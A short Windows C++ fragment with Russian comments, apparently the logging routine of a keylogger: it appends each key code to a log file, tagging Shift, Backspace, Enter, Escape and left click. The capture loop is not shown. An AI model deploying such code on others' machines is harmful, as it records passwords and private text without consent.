#include <iostream>
#include <windows.h>


using namespace std;


int save(int _key, char *file){
   cout << _key << endl; // Вывод числа  
   Sleep(10); // ожидание
   FILE *OUTPUT_FILE; // Создаём переменную для записи в файл   
   OUTPUT_FILE = fopen(file, "a+");  // Создаём файл(log.txt)
   // Далее мы смотрим, нажаты ли спец. клавиши и обрабатываем их
   if (_key == VK_SHIFT)
      fprintf(OUTPUT_FILE, "%s", "[SHIFT]");      
   else if (_key == VK_BACK)
      fprintf(OUTPUT_FILE, "%s", "[BACK]");  
   else if (_key == VK_LBUTTON)  
      fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");     
   else if (_key == VK_RETURN)  
      fprintf(OUTPUT_FILE, "%s", "[RETURN]\n");      
   else if (_key == VK_ESCAPE)  
      fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");     
   else // Если ничего не подошло, то просто записываем клавишу
      fprintf(OUTPUT_FILE, "%s", &_key);
      
   fclose(OUTPUT_FILE); // Закрываем файл
   
   return 0; // Возвращаем 0
}